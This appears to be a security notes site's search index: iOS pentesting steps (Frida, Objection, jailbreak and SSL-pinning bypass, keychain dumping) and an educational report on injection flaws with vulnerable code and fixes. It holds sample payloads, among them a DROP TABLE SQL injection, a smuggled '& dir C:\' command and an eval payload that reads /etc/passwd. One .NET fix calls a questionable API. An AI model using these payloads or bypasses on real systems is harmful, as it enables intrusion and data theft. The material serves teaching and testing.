can use the below command to find the databases of the application:<ul> <li><code>find ./ -name \"*.sqlite\" -or -name \"*.db\"</code></li> </ul> </li> </ul>"},{"location":"MobileSec/Iphone/#firebase-misconfiguration-json","title":"Firebase Misconfiguration (.json)","text":"<ul> <li>Firebase is a NoSQL Cloud-based database.</li> <li>The database is stored in JSON format and synchronised in real time.</li> <li>If find a firebase string, there might be a chance that it might be misconfigured. Navigate to the URL kind of this <code>https://&lt;path_of_the_file&gt;/.json</code>, Comes under Insecure Data Storage</li> <li>If the response is:<ul> <li>Permission Denied: This means that you cannot access it, so it's well configured</li> <li>Null response or a bunch of JSON data: This means that the database is public and you at least have read access.</li> </ul> </li> </ul>"},{"location":"MobileSec/Iphone/#ios-keychain","title":"iOS Keychain","text":"<ul> <li>iOS Keychain is one of the best ways to store ypur secrets.</li> <li>But sometimes developers do not store them properly and hence this leads to leakage of such secrets.</li> <li>commaand to find secrets from keychains <code>ios keychain dump</code> <pre><code>&gt;frida-ps -Ua # It gives list of apps open, then open the DVIAswiftv2, see \"com.highaltitudehacks.DVIAswiftv2.TF2TX3U8WG\"\n&gt; objection --gadget com.highaltitudehacks.DVIAswiftv2.TF2TX3U8WG explore \n# Open the application enter data submit\n&gt; objection --gadget com.highaltitudehacks.DVIAswiftv2.TF2TX3U8WG explore # you see the data entered in the application\n</code></pre></li> </ul>"},{"location":"MobileSec/Iphone/#ios-uipasteboard","title":"iOS UIPasteboard","text":"<ul> <li>UIPasteboard enables sharing data within applications. 2 types <code>ios pasteboard monitor</code><ul> <li>Systemwide Pasteboard: Sharing data with any application.</li> <li>Custom Pasteboard: Sharing data with app having same team ID.</li> </ul> </li> <li>An application can also prevent its users to copy sensitive data to the clipboard which is recommended</li> <li>Custom pasteboards can be creatd using pasteboardwithName:create or pasteboardWithUnique. The should not be used to these are deprecated since iOS 10. For Dynamic analysis, Objection pasteboard monitor can be used.</li> </ul>"},{"location":"MobileSec/Iphone/#ios-webviews","title":"iOS WebViews","text":"<ul> <li>These 3 types in iOS<ul> <li>UIWebView: It is deprecated starting on iOS 12 and should not be used. Javascript can be disabled</li> <li>WKWebView:<ul> <li>JS is enabled by default but disabled by javascriptEnabled properly</li> <li>JavaScriptCanOpenWindowsAutomatically properly can be used to block opening of new windows.</li> <li>hasOnlySecureContent properly can be used to verify resources are received using encrypted communication.</li> </ul> </li> <li>SFSafariViewController:<ul> <li>JavaScript cannot be disabled.</li> <li>Shares cookies and website data with Safari.</li> <li>Th user's activity and interaction are not visible to the app.</li> </ul> </li> </ul> </li> </ul>"},{"location":"MobileSec/Iphone/#ios-hot-patchingenforced-updating","title":"iOS Hot Patching/Enforced Updating","text":"<ul> <li>Developers can remotely patch all installations of their app instantly without having to resubmit the application to the App store and wait until it's approved.</li> <li>Applications should be forced updated.</li> <li>Try downloading an older version of the application and check if it allows forced update or not.</li> </ul>"},{"location":"MobileSec/Iphone/#sensitive-information-inside-application-memory","title":"Sensitive information inside Application Memory","text":"<ul> <li>Somewhere or the other sensitive data is definitely going to be stored in memory.</li> <li>We first dump the memory of the application suing objection or frida then <code>strings memory &gt; strings.txt</code></li> <li>The file can be then opened using any text editor.</li> </ul>"},{"location":"MobileSec/Iphone/#insecure-apisfunctions","title":"Insecure APIs/Functions","text":"Insecure Functions Command Weak Hashing Algorithms (MD5 &amp; SHA1) <code>otool -Iv &lt;app&gt; | grep \"MD5\"</code> Random Functions (random, srand, rand) <code>otool -Iv &lt;app&gt; | grep \"random\"</code> or \"rand\" Insecure Memory Allocation (malloc) <code>otool -Iv &lt;app&gt; | grep \"malloc\"</code> Vulnerable Functions (gets, memory, strncpy,strlen,vsnprintf,sscanf,strtok,alloca,sprintf,printf,vsprintf) <code>otool -Iv &lt;app&gt; | grep \"gets\"</code>"},{"location":"MobileSec/Iphone/#dynamic-analysis-ios","title":"Dynamic Analysis iOS","text":"<ul> <li>Here we are sending request and response trying to change the request observe response, trying to break the functionality.</li> <li>Tweaks are often used to bring extra features or customisation options to your device. (Tweaks installed only Jailbroken device)</li> <li>These are applications that can be installed using root privileges of the iOS device.</li> <li>In iOS pentesting, tweaks are going to help us bypass a lot of issues which we would be looking in coming sections.</li> <li>Substitute is a default application that gets installed when the device gets jailbroke.</li> <li>The app allows you to fine tune substitute and control tweak injection</li> <li>Attempts to prevent processes with memory limits from crashing.</li> <li>Cydia &amp; Sileo </li> <li>if Jailbroken your device using palerin Sileo, using Uncover, checkrin you get the Cydia, both GUI interface of APT for iOS</li> <li>It enables a user to find and install software not authorized by Apple on jailbroken.</li> <li>Third-Party App Store from where tweaks can be installed</li> </ul>"},{"location":"MobileSec/Iphone/#installing-frida","title":"Installing Frida","text":"<ul> <li>Add the repo link in the  <code>Sileo or cydia</code>  add the source install the app. Search repo here</li> <li>Add the <code>https://build.frida.re/</code>, then install the Frida app. To confirm installed or not using <code>frida-ps -Ua</code></li> </ul>"},{"location":"MobileSec/Iphone/#jailbreak-detection-bypass","title":"Jailbreak Detection bypass","text":"<ul> <li>Firda So to allow tweaks you require Jailbreak.</li> <li>Jailbreak Detection mechanism which is implemented by the developers, app cannot work on jailbroken device.</li> <li>However some developers do not consider this as a best practice, While those who implement it, might not implement properly. below js file</li> <li>Jailbreak detection bypass using <code>frida -U -f package_id -l jailbreak.js</code></li> <li>Shadow add the source <code>https://ios.jjolano.me/</code> then install the <code>shadow</code>app, click on <code>Always-On</code> by default for all the apps or select specific you bypass the detection.</li> <li>Liberty add the source <code>https://ryleylangus.com/repo/</code> then install Liberty Lite, Enable Liberty check the DVIA application check the jailbreak detection it's upto iOS 14 not sure after the verions</li> <li>A-Bypass add the source <code>http://repo.co.kr</code> then install, it support modern apps, </li> <li>Other Jailbreak Detection LINKS - FlyJB, HideJB, Liberty Lite, VNodeBypass, Hestia, iHide, KernBypass</li> </ul>"},{"location":"MobileSec/Iphone/#objection","title":"Objection","text":"<ul> <li>Objection is a runtime mobile exploration toolkit, To install objection simply run command <code>pip3 install objection, frida, frida-tools</code></li> <li>Explore the package using <code>objection --gadget package_name explore</code></li> <li>Disable jailbreak detection using <code>ios jailbreak disable</code></li> </ul>"},{"location":"MobileSec/Iphone/#ssl-pinning-and-bypass-using-frida","title":"SSL Pinning and Bypass using Frida","text":"<ul> <li>SSL Pinning is a technique that most application owners implement so that any request sent by the mobile application is not intercepted.</li> <li>SSL pinning is considered as the first and the most important step in the security mechanism of an application. But due to improper means, SSL Pinning can usually be bypassed. </li> <li>Check the package name using the <code>frida-ps -Us</code> then scripty is sslpinning.js run this command <code>frida -U -f package_id -l sslpinning.js</code></li> <li>SSL Kill Switch2 Enable SSL byass, it will bypass all the SSL restrictions.</li> <li>Objection the package using <code>objection --gadget package_name explore</code> then Disable SSL Pinning detection using <code>ios-sslpinning-disable</code></li> </ul>"},{"location":"MobileSec/Iphone/#local-authentication-mechanism-bypass","title":"Local Authentication Mechanism Bypass","text":"<ul> <li>Objection the package using <code>objection --gadget package_name explore</code> then Disable Authentication detection using <code>ios ui biometrics_bypass</code></li> <li>Non jailbroken device <code>objection explore</code> open the app DVIAswiftv2 app then Touch/Face ID Bypass menu, then hook with objection terminal <code>ios ui biometrics_bypass</code></li> <li>Try to cover the face then it will ask for the password, the tool objection going to bypass the password restriction [Udemy IOS pentesting  Vaibhav Lakhani]</li> </ul>"},{"location":"MobileSec/Iphone/#demo","title":"Demo","text":"<ul> <li>Download the App in Non-Jailbroken iphone</li> <li>Created .ipa file using this process</li> <li>Static Analysis<ul> <li>MobSF for automated analysis</li> </ul> </li> <li>Dynamic Analysis<ul> <li>Setup a Burpsuite with Base OS IP address, In the phone set manual proxy with your IP</li> <li>Enable the SSL Kill Switch2 in an app enforces any ssl this bypass the that.</li> <li>Try to capture webapp issues</li> </ul> </li> </ul>"},{"location":"MobileSec/Iphone/#frida-without-jailbreaking","title":"Frida without Jailbreaking","text":"<ul> <li>Find the valid security Identity for codesigning the IPA file:<ul> <li><code>security find-indentity -p codesigning -v</code></li> </ul> </li> <li>Patch and inject Frida server in the IPA using objection<ul> <li><code>objection patchipa --source Application.ipa --codesign-signature</code></li> </ul> </li> <li>Unzip the newly created IPA using the commands<ul> <li><code>unzip Application-frida-signed.ipa</code></li> </ul> </li> <li>Install the patched IPA to the iOS Device<ul> <li><code>ios-deploy --bundle Payload/SomeAppName.app -W -d</code></li> </ul> </li> <li>Keep the terminal command running and run objection on a new terminal<ul> <li>objection explore</li> </ul> </li> </ul>"},{"location":"MobileSec/Iphone/#ios-nuclei","title":"iOS Nuclei","text":"<pre><code>echo /User/ashok/Downloads/Payload/&lt;App_Name&gt;/ | nuclei -t &lt;Path_Nuclei_Templates&gt;\n</code></pre> <ul> <li>iOS Frida Scripts Link</li> <li> <p>iOS Pentesting Mindmap  </p> </li> <li> <p>iOS Penetest Checklist Link</p> </li> <li>HackerOne Reports <pre><code>https://hackerone.com/reports/746541\nhttps://hackerone.com/reports/7036\nhttps://hackerone.com/reports/168538\nhttps://hackerone.com/reports/575562\nhttps://hackerone.com/reports/328486\n</code></pre></li> </ul>"},{"location":"MobileSec/Mobile-Security-Basics/","title":"OWASP Mobile Top 10","text":"<ul> <li>It will categorises top 10 vulnerabilites acroos the world, First one is most common one.</li> </ul> Serial Number Name of the Vulnerability How to Find This Using Tools How to Mitigate This M1 Improper Credential Usage: This vulnerability occurs when an application stores credentials like API keys, tokens, or passwords in an insecure manner, such as hardcoding them directly in the app's source code or configuration files. Use static analysis tools like MobSF to decompile the app and search for hardcoded API keys, tokens, and credentials in the source code. Use a proxy tool like Burp Suite to intercept network traffic and check for authentication credentials being sent in plaintext or weak formats. Do not embed or hardcode any credentials directly in the app. Utilize secure credential storage, such as a mobile key management service or platform-specific secure storage (e.g., Android Keystore, iOS Keychain). Implement server-side authentication with temporary, short-lived tokens. M2 Inadequate Supply Chain Security: This refers to risks introduced by using third-party libraries, SDKs, or other components that may contain known vulnerabilities, outdated code, or malicious functionality. Use dependency scanning tools like Snyk or OWASP Dependency-Check to identify known vulnerabilities in third-party libraries and SDKs used in the app. Analyze the app's build process to ensure all dependencies are from trusted sources. Maintain a comprehensive Software Bill of Materials (SBOM) for the app. Regularly update all third-party libraries and dependencies to the latest, most secure versions. Vet all external components for known vulnerabilities before integration. M3 Insecure Authentication/Authorization: This vulnerability involves flaws in how an application verifies user identity (authentication) or grants access to resources (authorization), allowing an attacker to bypass security controls and gain unauthorized access. Use a proxy tool like Burp Suite to manipulate authentication requests. Try to bypass the login process by replaying requests with a different user ID, or by using stolen/expired session tokens. Test for weak password policies, lack of MFA, and improper session management. Implement strong authentication policies, including multi-factor authentication (MFA) and account lockout after repeated failed login attempts. Ensure all authentication and authorization logic is performed on the server-side, and that sessions are properly managed and invalidated after a period of inactivity or on logout. M4 Insufficient Input/Output Validation: This occurs when an application fails to properly validate, sanitize, or encode user-provided data, which can lead to injection attacks like SQL injection, command injection, or Cross-Site Scripting (XSS). Use a proxy tool like Burp Suite to modify input fields with common attack strings for SQL injection, command injection, and Cross-Site Scripting (XSS). Observe how the app and its backend handle these malicious inputs. Check for reflected or stored XSS vulnerabilities. Validate all user input on both the client and server side. Use parameterized queries for database interactions to prevent SQL injection. Sanitize and encode all output displayed in the app to prevent XSS and other injection attacks. M5 Insecure Communication: This vulnerability arises from the failure to use encryption or from using weak encryption during data transmission between the mobile app and its server, making data susceptible to interception and eavesdropping. Use a proxy tool like Burp Suite to intercept network traffic. Check if the app is using HTTP instead of HTTPS. Analyze the TLS/SSL configuration to ensure a secure cipher suite is used. Test for Man-in-the-Middle (MITM) attacks to see if the app accepts insecure connections or fails to validate server certificates. Enforce the use of TLS/SSL for all network communication. Implement strong certificate pinning to prevent MITM attacks and ensure the app only communicates with trusted servers. Avoid allowing the app to accept self-signed or invalid certificates. M6 Inadequate Privacy Controls: This issue is related to the app's failure to handle sensitive user data in a secure and compliant manner, such as storing personal information unencrypted or transmitting it to unauthorized third parties without user consent. Use a file system explorer on a rooted/jailbroken device to check for sensitive personal data (e.g., PII, health information) stored insecurely. Analyze network traffic with a proxy tool to see if private data is transmitted unencrypted or to unauthorized third-party services. Minimize the collection and storage of sensitive user data. Anonymize or encrypt all private data both in transit and at rest. Ensure data handling complies with privacy regulations like GDPR, HIPAA, and other country-specific laws. M7 Insufficient Binary Protections: This involves a lack of security measures in the app's executable code, which can make it easy for attackers to reverse engineer, tamper with, or debug the app to discover its inner workings or bypass controls. Use dynamic analysis tools like Frida or Objection to test for and bypass security controls like root/jailbreak detection, debugger detection, or anti-tampering checks. Use a static analysis tool like MobSF to identify if the app binary has been obfuscated or protected against reverse engineering. Implement binary hardening techniques such as code obfuscation, anti-tampering, and anti-debugging. Use strong root/jailbreak detection and integrity checks to prevent the app from running on a compromised device. M8 Security Misconfiguration: This occurs when the application or its underlying server and components are configured with insecure settings, such as having debug mode enabled in a production environment, or using default passwords for admin interfaces. Use a static analysis tool like MobSF to review the app's manifest file (e.g., AndroidManifest.xml) for insecure settings such as debuggable flags enabled in production, or public-facing components that shouldn't be. On the server side, check for open ports, default credentials, or directory listings. Adhere to secure configuration baselines. Disable debugging and other development-related features in production builds. Follow the principle of least privilege by ensuring all components have minimal permissions required to function. M9 Insecure Data Storage: This vulnerability occurs when an application stores sensitive data on the mobile device's local storage in an unencrypted or easily accessible format, allowing attackers with physical access or a compromised device to retrieve it. Use a file system viewer on a rooted/jailbroken device to inspect the app's data directories. Look for sensitive data in databases (<code>.db</code>), shared preferences (<code>.xml</code>), or unencrypted files. Use a tool like SQLite Browser to open and inspect local databases. Avoid storing sensitive data on the device whenever possible. When necessary, use the platform's secure storage APIs (e.g., iOS Keychain, Android Keystore). Encrypt all sensitive data at rest using strong encryption algorithms. M10 Insufficient Cryptography: This is the failure to use strong, modern, and well-vetted cryptographic algorithms to protect data. This includes using outdated or broken encryption methods, or implementing custom, flawed crypto logic. Use a static analysis tool like MobSF to identify the cryptographic algorithms used by the app. Use a proxy tool to analyze encrypted network traffic for weak or outdated cipher suites. Attempt to tamper with encrypted data to check for proper integrity checks. Use strong, industry-standard cryptographic algorithms (e.g., AES-256). Avoid implementing custom or homegrown cryptographic solutions. Ensure proper key management and secure key exchange. Do not use outdated or broken algorithms like MD5 or RC4. New 1 Data Leakage: This occurs when sensitive information is unintentionally exposed and stored in insecure locations like logs, crash reports, or temporary files, making it accessible to other applications or attackers. Use a proxy tool like Burp Suite to capture all network traffic and analyze it for sensitive data being sent or received. On a rooted/jailbroken device, use a file system explorer to check log files (<code>logcat</code> for Android) and local storage for plaintext sensitive information. Avoid logging or storing any sensitive data on the device. Ensure that any temporary files are immediately and securely deleted after use. Use the device's secure storage mechanisms and encrypt data both at rest and in transit. New 2 Hardcoded Secrets: This vulnerability involves embedding confidential information, such as API keys, cryptographic keys, or credentials, directly into the app's source code or configuration files. This allows attackers to easily extract them through reverse engineering. Use static analysis tools like MobSF or a decompiler like JADX to analyze the app's code. Search for hardcoded strings that look like API keys, URLs, or other secrets. Run the <code>strings</code> command on the app binary to quickly find plaintext strings. Do not hardcode secrets. Use a secure key management system, store credentials on a remote server, or leverage platform-specific secure storage (e.g., iOS Keychain, Android Keystore). New 3 Insecure Access Control: This is a failure to properly restrict a user's access to certain functions or data. An attacker can exploit this to access information or perform actions they are not authorized for, either as a different user (horizontal privilege escalation) or as an administrator (vertical privilege escalation). Use a proxy tool like Burp Suite. Authenticate as a standard user, then try to access privileged endpoints or data by manually changing request parameters. Test for both horizontal (accessing another user's data by changing a user ID) and vertical (accessing an admin-only function) privilege escalation. Enforce strict access control rules on the server side for every request. Never rely on client-side checks for authorization. Implement the principle of least privilege, ensuring users can only access what is absolutely necessary for their role. New 4 Path Overwrite and Path Traversal: This vulnerability allows an attacker to read or write files outside of the app's intended directory. It is often caused by insufficient validation of user input that includes file paths, allowing an attacker to use special characters like <code>../</code> to navigate the file system. Use a proxy tool like Burp Suite to inject path traversal sequences (<code>../</code>, <code>..\\</code>) into any user-controllable input that involves file operations, such as file uploads or image loading. Check if the app or server reads or writes files to an unintended location. Sanitize all user input related to file paths. Implement a strict allow-list of acceptable file names and paths. Use platform-specific file system APIs that are designed to prevent path traversal attacks. New 5 Unprotected Endpoints: This vulnerability affects the app's components (like Android Activities, Services, or iOS Deeplinks) that can be invoked from other apps. If these components are not properly secured, a malicious app can call them and pass malicious data to compromise the application. Use static analysis tools like MobSF to review the app's manifest file and identify all exported components. On a test device, use tools like <code>adb</code> (for Android) to try and launch these components with malicious data to see if a crash or other unexpected behavior occurs. Ensure that app components are not exported unless absolutely necessary. When an endpoint must be exposed, protect it with proper permissions. Implement robust input validation and sanitization for any data received by these endpoints from external sources. New 6 Unsafe Sharing: This vulnerability occurs when an application uses insecure methods for inter-app communication, which can lead to the unintended exposure of sensitive data to other applications on the same device. This often involves using insecure intents or content providers. Use dynamic analysis and a file system viewer on a rooted/jailbroken device to monitor data being passed between apps. Look for sensitive data being written to shared directories that are not properly secured or for broad intent filters that could be intercepted by other apps. Use explicit and secure intents for inter-app communication. When sharing sensitive data, use private Content Providers and enforce strict permissions to ensure only authorized applications can access the data."},{"location":"MobileSec/Mobile-Security-Basics/#tools","title":"Tools","text":""},{"location":"MobileSec/Mobile-Security-Basics/#process","title":"Process","text":""},{"location":"MobileSec/Mobile-Security-Basics/#mitigations","title":"Mitigations","text":""},{"location":"appsec/WAHH/","title":"WAHH","text":"<p>This report provides a comprehensive analysis of security vulnerabilities identified across two key cybersecurity documents: \"OWASP Code Review Guide v2.pdf\" and \"The Web Application Hacker's Handbook.pdf.\" It aims to educate developers on various threat types, </p>"},{"location":"appsec/WAHH/#vulnerability-report","title":"Vulnerability Report","text":""},{"location":"appsec/WAHH/#1-injection-vulnerabilities","title":"1. Injection Vulnerabilities","text":"<p>Injection vulnerabilities allow attackers to inject malicious content or commands into an application, modifying its intended behavior. These are common and often easy to exploit.</p>"},{"location":"appsec/WAHH/#sql-injection","title":"SQL Injection","text":"<ul> <li> <p>Description / Definition: SQL Injection occurs when an attacker can submit crafted input to interfere with an application's interaction with back-end databases. This can lead to the disclosure or leaking of sensitive information, data integrity issues (modifying, adding, or deleting data), elevation of privileges, or gaining access to the back-end network. The core problem is that the SQL parser cannot distinguish between code and data when untrusted input is included in SQL statements.</p> </li> <li> <p>Vulnerable Code Example:     Applications often construct SQL statements by concatenating user-supplied input directly into the query string without proper sanitization.     <pre><code>// Java example from OWASP Guide\nHttpServletRequest request = ...;\nString userName = request.getParameter(\"name\");\nConnection con = ...;\nString query = \"SELECT * FROM Users WHERE name = '\" + userName + \"'\"; // Vulnerable concatenation\ncon.execute(query);\n</code></pre>     An attacker could input <code>\"' OR 1=1\"</code> for <code>userName</code>, making the query:     <code>SELECT * FROM Users WHERE name = '' OR 1=1'</code>. This would return all user records.</p> <p>Another example from \"The Web Application Hacker's Handbook\" for an ASP.NET application: <pre><code>// C# .NET example (representative, based on)\nstring employeeID = request.getParameter(\"ei_id\");\nstring sql = \"SELECT name, lastname FROM authors WHERE ei_id = '\" + employeeID + \"'\"; // Vulnerable\n// ... execute sql\n</code></pre> An attacker could insert <code>\"123';DROP TABLE pubs --\"</code> for <code>employeeID</code>, executing <code>SELECT name, lastname FROM authors WHERE ei_id = '123'; DROP TABLE pubs --'</code>.</p> </li> <li> <p>Root Cause: The primary root cause is the unprotected concatenation of untrusted user input directly into SQL statements. This occurs because the SQL parser cannot distinguish between the developer's intended code and the malicious data injected by the attacker. Additionally, a lack of input validation or parameter mishandling can expose this flaw.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Parameterize SQL queries: This is considered one of the most effective ways to prevent SQL Injection. It involves using SQL methods provided by the programming language or framework that explicitly separate code from data.</li> <li>Use Stored Procedures: While generally helpful, stored procedures must be correctly implemented and not build dynamic SQL statements internally using untrusted input, as this can reintroduce the vulnerability.</li> <li>Input Validation: Always validate user input by testing type, length, format, and range. Accept only expected values and reject entries containing binary data, escape sequences, or comment characters. Implement multiple layers of validation.</li> <li>HtmlEncode all user input: This can mitigate some forms of injection, though it's not a complete solution for SQL injection specifically.</li> <li>Developer Training: Train developers in secure coding techniques to avoid common vulnerabilities.</li> </ol> </li> <li> <p>Corrected Code Example:     Using parameterized queries in Java:     <pre><code>// Java example with PreparedStatement from OWASP Guide\nHttpServletRequest request = ...;\nString userName = request.getParameter(\"name\");\nConnection con = ...;\nString query = \"SELECT * FROM Users WHERE name = ?\"; // Use a placeholder\nPreparedStatement pstmt = con.prepareStatement(query);\npstmt.setString(1, userName); // Set parameter safely\nResultSet results = pstmt.executeQuery();\n</code></pre>     Using parameterized queries in .NET:     <pre><code>// C# .NET example (representative, based on)\nusing (SqlConnection conn = new SqlConnection(connectionString)) {\n    DataSet dataObj = new DataSet();\n    SqlDataAdapter sqlAdapter = new SqlDataAdapter(\"StoredProc\", conn);\n    sqlAdapter.SelectCommand.CommandType = CommandType.StoredProcedure; // Or CommandType.Text for direct query\n    sqlAdapter.SelectCommand.Parameters.Add(\"@usrId\", SqlDbType.VarChar, 15);\n    sqlAdapter.SelectCommand.Parameters[\"@usrId\"].Value = UID.Text;\n    // ... execute\n}\n</code></pre></p> </li> <li> <p>Explanation of Fix: Parameterized queries (and correctly implemented stored procedures) explicitly tell the database engine which parts of the statement are code and which are data, preventing the attacker's input from being interpreted as executable SQL. The database treats the user-supplied value as a literal string, even if it contains SQL syntax. Strict input validation reduces the attack surface by ensuring that only data conforming to expected types and formats is processed, further limiting an attacker's ability to craft malicious inputs.</p> </li> </ul>"},{"location":"appsec/WAHH/#nosql-injection","title":"NoSQL Injection","text":"<ul> <li> <p>Description / Definition: NoSQL injection vulnerabilities arise in applications using NoSQL data stores (which break from standard relational database architectures and use key/value mappings without a fixed schema). Similar to SQL injection, these allow attackers to interfere with how the application processes data in NoSQL databases.</p> </li> <li> <p>Vulnerable Code Example: (Representative, based on's explanation of MongoDB injection)     <pre><code>// JavaScript (Node.js/MongoDB) example\nrouter.get('/products', function(req, res) {\n    let query = {\n        category: req.query.category // User-controlled input\n    };\n    db.collection('products').find(query).toArray(function(err, docs) {\n        // ... process results\n    });\n});\n</code></pre>     An attacker might send <code>?category[$ne]=null</code> as input, which for some NoSQL databases might alter the query's logic to return all documents where the category is not null.</p> </li> <li> <p>Root Cause: The root cause is similar to SQL injection: unsafe incorporation of user-supplied data into queries or commands executed by the NoSQL database. This is compounded by the flexible, schema-less nature of NoSQL, which can sometimes lead developers to be less rigorous with input handling compared to traditional SQL.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Use specific API functions for queries: Most NoSQL databases provide APIs that distinguish between data and commands.</li> <li>Strict Input Validation: Implement rigorous validation for all user input that interacts with the NoSQL database.</li> <li>Sanitization: Ensure proper sanitization of input, especially for dynamic queries.</li> </ol> </li> <li> <p>Explanation of Fix: Using specific API functions helps ensure that user input is treated as literal data and not as part of the query structure, thus preventing code execution. Strict input validation and sanitization further reduce the risk by disallowing malicious characters or structures from reaching the database layer.</p> </li> </ul>"},{"location":"appsec/WAHH/#xpath-injection","title":"XPath Injection","text":"<ul> <li> <p>Description / Definition: XPath injection vulnerabilities occur when user-supplied input is incorporated unsafely into XPath queries, which are used to navigate XML documents. This can allow an attacker to bypass application logic or extract arbitrary data from XML data stores.</p> </li> <li> <p>Vulnerable Code Example: (Representative, based on's concept of informed XPath injection)     <pre><code>// Java example (representative)\nString username = request.getParameter(\"username\");\nString password = request.getParameter(\"password\");\nString query = \"/users/user[username='\" + username + \"' and password='\" + password + \"']\";\n// ... execute XPath query against an XML document\n</code></pre>     An attacker could input <code>\"' or '1'='1\"</code> for <code>username</code>, bypassing authentication.</p> </li> <li> <p>Root Cause: The root cause is the direct concatenation of user-supplied data into XPath query strings without proper escaping or validation, allowing an attacker to manipulate the query's logic.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Use Parameterized XPath Queries: Employ APIs that allow parameters to be bound to XPath expressions, treating input as data.</li> <li>Whitelist Validation: For dynamic parts of the query (e.g., element names), use a whitelist approach to ensure only expected values are used.</li> <li>Escape Special Characters: Properly escape all XPath metacharacters within user input before inclusion in queries.</li> </ol> </li> <li> <p>Explanation of Fix: Parameterized queries and proper escaping ensure that user input cannot alter the structure or meaning of the XPath expression, preventing injection. Whitelisting restricts dynamic parts of queries to safe, predefined values.</p> </li> </ul>"},{"location":"appsec/WAHH/#ldap-injection","title":"LDAP Injection","text":"<ul> <li> <p>Description / Definition: LDAP (Lightweight Directory Access Protocol) injection arises when user-supplied input is embedded directly into LDAP queries without proper sanitization. This can allow attackers to bypass authentication, retrieve unauthorized information from directory services (like Active Directory), or subvert application logic.</p> </li> <li> <p>Vulnerable Code Example: (Representative, based on's example)     <pre><code>// Java example (representative)\nString username = request.getParameter(\"username\");\nString password = request.getParameter(\"password\");\nString ldapFilter = \"(&amp;(uid=\" + username + \")(userPassword=\" + password + \"))\";\n// ... search LDAP directory with ldapFilter\n</code></pre>     An attacker could submit <code>*)(objectClass=*)</code> for <code>username</code>, which might modify the filter to <code>(&amp;(uid=*)(objectClass=*))(userPassword=...))</code> allowing arbitrary access.</p> </li> <li> <p>Root Cause: The root cause is the unsafe direct inclusion of user input into LDAP filters or queries, without proper escaping of LDAP special characters (e.g., <code>*</code>, <code>(</code>, <code>)</code>, <code>=</code>, <code>,</code>).</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Escape LDAP Special Characters: Implement rigorous escaping for all user-supplied data that will be used in LDAP queries.</li> <li>Use Parameterized APIs: Utilize LDAP APIs that support parameterized queries, similar to prepared statements in SQL.</li> <li>Strict Input Validation: Validate input against a whitelist of allowed characters or expected patterns.</li> </ol> </li> <li> <p>Explanation of Fix: Escaping LDAP metacharacters ensures that user input is treated as literal data and not as control characters that could alter the LDAP query's structure. Parameterized APIs provide a secure separation between query logic and user data.</p> </li> </ul>"},{"location":"appsec/WAHH/#os-command-injection","title":"OS Command Injection","text":"<ul> <li> <p>Description / Definition: OS Command Injection allows an attacker to execute arbitrary operating system commands on the server running the web application. This happens when an application incorporates user-supplied input into commands that are passed to an underlying operating system shell. A successful attack can lead to full compromise of the underlying operating system.</p> </li> <li> <p>Vulnerable Code Example: <pre><code>// C# ASP.NET example from Web Application Hacker's Handbook\nstring dirName = \"C:\\\\filestore\\\\\" + Directory.Text;\nProcessStartInfo psInfo = new ProcessStartInfo(\"cmd\", \"/c dir \" + dirName); // Vulnerable concatenation\nProcess proc = Process.Start(psInfo);\n</code></pre>     An attacker could input <code>&amp; dir C:\\ --</code> to <code>Directory.Text</code>, which would execute <code>cmd /c dir C:\\filestore\\ &amp; dir C:\\ --</code>, leading to <code>dir C:\\</code> being executed.</p> </li> <li> <p>Root Cause: The root cause is the direct concatenation of untrusted user input into system commands that are executed by functions like <code>Process.Start</code> (C#), <code>Runtime.exec</code> (Java), or <code>system</code> (PHP/Perl). The application fails to properly separate the command from its arguments or data.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Avoid Shell Execution: Do not pass user-supplied input, or data derived from it, into any dynamic execution or shell-level command functions if at all possible.</li> <li>Use Specific APIs: If external processes must be launched, use APIs that allow command arguments to be passed as separate parameters (e.g., <code>ProcessStartInfo.Arguments</code> in C#, <code>ProcessBuilder</code> in Java), which prevents shell metacharacters from being interpreted.</li> <li>Whitelist Validation: If dynamic command parts are unavoidable, use a strict whitelist of known good values and reject any input not matching this list.</li> <li>Least Privilege: Configure the application to run with the least possible operating system privileges.</li> </ol> </li> <li> <p>Corrected Code Example:     Using arguments array in C#:     <pre><code>// C# ASP.NET example with safe argument passing (representative)\nstring dirName = Directory.Text; // User input\n// Ensure dirName itself does not contain malicious paths or commands if it needs to be part of the command's target\nProcessStartInfo psInfo = new ProcessStartInfo(\"cmd.exe\", \"/c dir \" + Process.EscapeArgument(dirName)); // Safer\n// For more complex commands or variable inputs, pass arguments separately:\n// ProcessStartInfo psInfo = new ProcessStartInfo(\"cmd.exe\");\n// psInfo.Arguments = \"/c dir \\\"\" + dirName + \"\\\"\"; // Escape the path or ensure it's safe\nProcess proc = Process.Start(psInfo);\n</code></pre>     Using <code>ProcessBuilder</code> in Java:     <pre><code>// Java example with ProcessBuilder (representative)\nString userName = request.getParameter(\"name\");\nProcessBuilder pb = new ProcessBuilder(\"cmd.exe\", \"/c\", \"echo\", userName); // Arguments as separate strings\npb.start();\n</code></pre></p> </li> <li> <p>Explanation of Fix: Avoiding direct shell execution where user input can manipulate commands is the best defense. When direct execution is unavoidable, passing arguments as separate parameters to specific APIs prevents the shell from interpreting user-supplied metacharacters (like <code>&amp;</code>, <code>|</code>, <code>;</code>) as new commands, treating them instead as literal parts of an argument. Whitelisting provides a strong layer of control over accepted inputs.</p> </li> </ul>"},{"location":"appsec/WAHH/#script-injection-dynamic-execution","title":"Script Injection (Dynamic Execution)","text":"<ul> <li> <p>Description / Definition: Script injection occurs when an application dynamically executes code that is generated at runtime, and user input is incorporated into this code. Attackers can supply crafted input that breaks out of the intended data context and specifies commands to be executed on the server. This is distinct from XSS, as it targets server-side scripting languages.</p> </li> <li> <p>Vulnerable Code Example: (Representative, based on PHP/Perl <code>eval()</code> and Classic ASP <code>Execute()</code> examples in)     <pre><code>// PHP example (representative)\n$mysearch = $_GET['search_query'];\neval(\"\\$result = \" . $mysearch . \";\"); // Vulnerable if $mysearch contains executable code\n</code></pre>     If <code>$mysearch</code> is <code>wahh; system('cat /etc/passwd')</code>, it would execute <code>system('cat /etc/passwd')</code>.</p> </li> <li> <p>Root Cause: The root cause is the passing of user-supplied input, or data derived from it, into dynamic execution or include functions of scripting languages. These functions interpret concatenated strings as executable code, rather than literal data.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Avoid Dynamic Execution of User Input: The best way to prevent script injection is to never pass user-supplied input into 